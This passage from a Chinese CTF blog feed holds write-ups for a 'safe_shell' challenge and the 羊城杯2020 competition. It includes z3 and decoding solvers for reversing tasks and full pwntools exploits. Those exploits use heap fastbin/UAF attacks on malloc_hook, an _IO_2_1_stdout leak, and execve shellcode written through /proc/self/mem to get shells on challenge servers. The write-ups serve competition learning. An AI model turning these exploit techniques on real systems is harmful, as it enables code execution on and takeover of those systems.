class="headerlink" title="防御函数："></a>防御函数：</h4><p>在监测到3次密码错误后，开始拒绝连接，并且会在<code>admin.txt</code>中写入随机的512个字母数字组合的字符。这样就基本登陆不上去了,因为是随机的，并且name跟password最大也就是0x100的长度。</p><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>绕过check，登入diy shell </li><li>读入mmaps，leak 出 程序的base</li><li>open mem文件，准备写入</li><li>确定写入偏移为help后<code>0x16CC + base</code>,通过<code>set_lseek</code>来修改指针指向</li><li>wirte 写入8字节shellcode</li><li>通过<code>set_lseek</code>来修改指针+8，再次写入，循环写好shellcode</li><li>输入help即可</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./safe_shell'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'\x00'</span>)sa(<span class="hljs-string">'pass'</span>,<span class="hljs-string">'\x00'</span>)sl(<span class="hljs-string">'readonly'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'maps'</span>)s = ru(<span class="hljs-string">'-5'</span>)s = s[<span class="hljs-number">2</span>:<span class="hljs-number">14</span>]base = int(s,<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'base'</span>,base)patch_addr = <span class="hljs-number">0x16CC</span> + basesl(<span class="hljs-string">'open'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'mem'</span>)shellcode = <span class="hljs-string">'\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> range(len(shellcode)//<span class="hljs-number">8</span>+<span class="hljs-number">1</span>):    sl(<span class="hljs-string">'set_lseek'</span>)    sla(<span class="hljs-string">' file offset'</span>,str(patch_addr + i*<span class="hljs-number">8</span>))    sla(<span class="hljs-string">'$'</span>,<span class="hljs-string">'write'</span>)    sa(<span class="hljs-string">'your context'</span>,shellcode[i*<span class="hljs-number">8</span>:(i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>)])sl(<span class="hljs-string">'help'</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>羊城杯2020部分wp</title>
    <link href="/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2020部分wp"><a href="#羊城杯2020部分wp" class="headerlink" title="羊城杯2020部分wp"></a>羊城杯2020部分wp</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>Python exe的逆向。其中在修复pyc时，个人不是很熟悉，记录一下：</p><p> 在脱去以后，会有主程序，跟一个struct的文件。</p><p>要保证主程序与struct的前面的魔法字节是相同一样的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/yFiJmM.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/r9gtZs.png" srcset="/img/loading.gif" alt><br>重点关注前16个字节，保证相同即可。<br>修复好pyc后，就可以进行反编译。<br>剩下的就是逆算法，需要用到z3。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<span class="hljs-string">'''a1 = Int('a1')a2 = Int('a2')a3 = Int('a3')a4 = Int('a4')a5 = Int('a5')a6 = Int('a6')a7 = Int('a7')a8 = Int('a8')a9 = Int('a9')a10 = Int('a10')a11 = Int('a11')a12 = Int('a12')a13 = Int('a13')a14 = Int('a14')s.add(a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5 + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36 + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60 + a14 * 29 == 22748)s.add(a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25 + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66 + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39 + a14 * 17 == 7258)s.add(a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65 + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33 + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34 + a14 * 23 == 26190)s.add(a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59 + a5 * 49 + a6 * 81 + a7 * 25 + a8 * (2 ** 7) - a9 * 32 + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60 + a14 * 29 == 37136)s.add(a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52 + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36 + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915)s.add(a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45 + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26 + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61 + a14 * 28 == 17298)s.add(a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42 + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47 + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44 + a14 * 65 == 19875)s.add(a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85 + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30 + a10 * 25 + a11 * 11 + a12 * 57 - a13 * 50 - a14 * 9 == 22784)s.add(a1 * 8 + a2 * 6 + a3 * 64 - a4 * 85 + a5 * 73 + a6 * 29 + a7 * 2 + a8 * 23 - a9 * 36 + a10 * 5 + a11 * 2 + a12 * 47 - a13 * 64 + a14 * 27 == 9710)s.add(a1 * 67 - a2 * 68 + a3 * 68 - a4 * 51 - a5 * 43 + a6 * 81 + a7 * 22 - a8 * 12 - a9 * 38 + a10 * 75 + a11 * 41 + a12 * 27 - a13 * 52 + a14 * 31 == 13376)s.add(a1 * 85 + a2 * 63 + a3 * 5 - a4 * 51 + a5 * 44 + a6 * 36 + a7 * 28 + a8 * 15 - a9 * 6 + a10 * 45 + a11 * 31 + a12 * 7 - a13 * 67 + a14 * 78 == 24065)s.add(a1 * 47 + a2 * 64 + a3 * 66 - a4 * 5 + a5 * 43 + a6 * 112 + a7 * 25 + a8 * 13 - a9 * 35 + a10 * 95 + a11 * 21 + a12 * 43 - a13 * 61 + a14 * 20 == 27687)s.add(a1 * 89 + a2 * 67 + a3 * 85 - a4 * 25 + a5 * 49 + a6 * 89 + a7 * 23 + a8 * 56 - a9 * 92 + a10 * 14 + a11 * 89 + a12 * 47 - a13 * 61 - a14 * 29 == 29250)s.add(a1 * 95 + a2 * 34 + a3 * 62 - a4 * 9 - a5 * 43 + a6 * 83 + a7 * 25 + a8 * 12 - a9 * 36 + a10 * 16 + a11 * 51 + a12 * 47 - a13 * 60 - a14 * 24 == 15317)if s.check() == sat:    result = s.model()    print result'''</span><span class="hljs-string">'''[a2 = 24, a13 = 88, a6 = 43, a9 = 52, a14 = 33, a5 = 104, a12 = 74, a7 = 28, a1 = 119, a10 = 108, a11 = 88, a8 = 91, a4 = 7, a3 = 10]'''</span>key = [<span class="hljs-number">10</span>,<span class="hljs-number">24</span>,<span class="hljs-number">119</span>,<span class="hljs-number">7</span>,<span class="hljs-number">104</span>,<span class="hljs-number">43</span>,<span class="hljs-number">28</span>,<span class="hljs-number">91</span>,<span class="hljs-number">108</span>,<span class="hljs-number">52</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">88</span>,<span class="hljs-number">33</span>]flag = <span class="hljs-string">' '</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>):    key[i<span class="hljs-number">-1</span>] = key[i] ^ key[i - <span class="hljs-number">1</span>]    flag += chr(key[i<span class="hljs-number">-1</span>])flag = flag[::<span class="hljs-number">-1</span>]flag += chr(<span class="hljs-number">33</span>)print(flag)</code></pre></div><p>其中在z3中处理逻辑运算时，是很特殊的，这个需要注意，具体可以看z3的官方文档。<br>可以参考：<br><a href="https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/" target="_blank" rel="noopener">https://arabelatso.github.io/2018/06/14/Z3%20API%20in%20Python/</a></p><p>还有遇到逻辑左移右移：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-number">1.</span> “&gt;&gt;”int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &gt;&gt; <span class="hljs-number">1</span>);先将x转成二进制 <span class="hljs-number">10000</span>, 不读最后一位， 输出 <span class="hljs-number">1000</span>， 即为<span class="hljs-number">8</span>;右移一位相当于数值除以<span class="hljs-number">2</span><span class="hljs-number">2.</span> “&lt;&lt;”int x = <span class="hljs-number">16</span>; printf(<span class="hljs-string">"%d\n"</span>, x &lt;&lt; <span class="hljs-number">1</span>);先将x转成二进制 <span class="hljs-number">10000</span>, 往最后再读取一位(<span class="hljs-number">0</span>, 或根据是否已经有移位)， 输出 <span class="hljs-number">100000</span>， 即为<span class="hljs-number">32</span>;左移，若移动位数K等于或大于数据长度N,通常只移动K mod N 位数左移一位相当于数值乘以<span class="hljs-number">2</span></code></pre></div><p>在这里是左移7，也就是乘 2 的7次方。</p><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>3层加密.</p><ul><li>一个base64</li><li>一个以13字节，分割字符，进行移位</li><li>单字节凯撒加密，但是也加入了对数字的处理</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64key = <span class="hljs-string">'EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]buf = [<span class="hljs-number">0</span>]*<span class="hljs-number">52</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key)):    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">64</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">90</span>:        buf[i] = (key[i] - <span class="hljs-number">65</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">96</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">122</span>:        buf[i] =  (key[i] - <span class="hljs-number">97</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">0x61</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> key[i] &gt; <span class="hljs-number">47</span> <span class="hljs-keyword">and</span> key[i] &lt;=<span class="hljs-number">57</span>:        buf[i] = (key[i] - <span class="hljs-number">48</span> - <span class="hljs-number">3</span>) % <span class="hljs-number">10</span> + <span class="hljs-number">48</span>        <span class="hljs-keyword">continue</span>    buf[i] = key[i]buf = [chr(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> buf]key2 = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> buf:    key2 += ikey2 = key2[<span class="hljs-number">13</span>:<span class="hljs-number">26</span>] + key2[<span class="hljs-number">39</span>:<span class="hljs-number">52</span>] + key2[:<span class="hljs-number">13</span>] + key2[<span class="hljs-number">26</span>:<span class="hljs-number">39</span>]flag = base64.b64decode(key2)print(flag)</code></pre></div><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="sing-in"><a href="#sing-in" class="headerlink" title="sing in"></a>sing in</h3><p>入门堆题，存在uaf，进行<code>fastbin attcak</code>即可。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10029</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'name'</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x60</span>mes = <span class="hljs-string">'b'</span> * <span class="hljs-number">23</span>add(<span class="hljs-number">0x100</span>,payload,mes)add(<span class="hljs-number">0x60</span>,payload,mes)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x60</span>,<span class="hljs-string">' '</span>,mes)show()ru(<span class="hljs-string">"Game[2]'s name :"</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b20</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)malloc_hook = libc_base + <span class="hljs-number">0x3c4aed</span>add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))add(<span class="hljs-number">0x60</span>,p64(malloc_hook),p64(malloc_hook))one = <span class="hljs-number">0x4527a</span> + libc_basepayload = <span class="hljs-string">'1'</span> * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0</span>) + p64(one)add(<span class="hljs-number">0x60</span>,payload,payload)itr()</code></pre></div><p>其中可以申请一个堆，进行getshell，也可以同时2次free同一个chunk，触发报错函数，而调用报错函数的时候又会用到<code>malloc_hook</code>，从而getshell。</p><h3 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><ul><li>只有add和del功能</li><li>存在uaf</li><li>只能申请&lt;0x70的堆块</li></ul><h4 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h4><p>需要利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列。</p><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/176139" target="_blank" rel="noopener">https://www.anquanke.com/post/id/176139</a></p><p><a href="https://blog.csdn.net/plus_re/article/details/79265805" target="_blank" rel="noopener">https://blog.csdn.net/plus_re/article/details/79265805</a></p><p><code>malloc_consolidate</code>具体步骤如下：</p><ol><li>判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。</li><li>按照fastbin由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。</li><li>首先尝试合并<code>pre_chunk</code>。</li><li>然后尝试合并<code>next_chunk</code>：如果<code>next_chunk</code>是<code>top_chunk</code>，则直接合并到<code>top_chunk</code>，然后进行第六步；如果<code>next_chunk</code>不是<code>top_chunk</code>，尝试合并。</li><li>将处理完的chunk插入到unsorted bin头部。</li><li>获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。</li></ol><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>利用scanf函数来触发<code>malloc_consolidate</code>，使<strong>相邻fastbin堆块</strong>进行合并，并放入unsortedbin的 队列，在堆上留下libc的相关地址</li><li>利用fastbin attack ，打<code>__IO_2_1_stdout</code>，泄漏libc</li><li>利用fastbin attack ，打<code>malloc_hook</code></li></ul><p>难点在申请堆块的数量,题目限制了19个，是刚刚够用。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,name,mes)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">"game's name:"</span>,str(name))    sla(<span class="hljs-string">'mes'</span>,str(mes))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index:'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x28</span>    mes = <span class="hljs-string">'2'</span> * <span class="hljs-number">23</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#0</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#1</span>    add(<span class="hljs-number">0x28</span>,payload,mes) <span class="hljs-comment">#2</span>    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#3</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#4</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#5</span>    add(<span class="hljs-number">0x68</span>,payload,mes) <span class="hljs-comment">#6</span>    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">4</span>)    free(<span class="hljs-number">5</span>)    <span class="hljs-comment"># debug()</span>    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'2'</span>)    sl(<span class="hljs-string">'1'</span>*<span class="hljs-number">0x500</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    free(<span class="hljs-number">2</span>)    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#7</span>    add(<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0xb5dd</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#8</span>    free(<span class="hljs-number">6</span>)    free(<span class="hljs-number">7</span>)    free(<span class="hljs-number">6</span>)    add(<span class="hljs-number">0x68</span>,p8(<span class="hljs-number">0x90</span>),<span class="hljs-string">'1'</span>) <span class="hljs-comment">#9</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#10</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#11</span>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>) <span class="hljs-comment">#12</span>    payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    sla(<span class="hljs-string">'Your choice :'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'104'</span>) <span class="hljs-comment">#13</span>    sa(<span class="hljs-string">'name'</span>,payload)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./pwn'</span>)        <span class="hljs-comment"># io = remote('39.101.184.181',10000)</span>        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)ru(<span class="hljs-string">'age'</span>)sl(<span class="hljs-string">'1'</span>)free(<span class="hljs-number">10</span>)free(<span class="hljs-number">11</span>)free(<span class="hljs-number">10</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_addradd(<span class="hljs-number">0x68</span>,p64(malloc_hook),<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>)one_rec = <span class="hljs-number">0xf0364</span> + libc_addrpayload = <span class="hljs-string">'1'</span> * (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) + p64(<span class="hljs-number">0</span>)+ p64(one_rec)add(<span class="hljs-number">0x68</span>,payload,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">6</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020 “中能融合杯” 部分wp</title>
    <link href="/2020/09/12/2020%20%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%20%E9%83%A8%E5%88%86wp/"/>
    <url>/2020/09/12/2020%20%E2%80%9C%E4%B8%AD%E8%83%BD%E8%9E%8D%E5%90%88%E6%9D%AF%E2%80%9D%20%E9%83%A8%E5%88%86wp/</url>
    
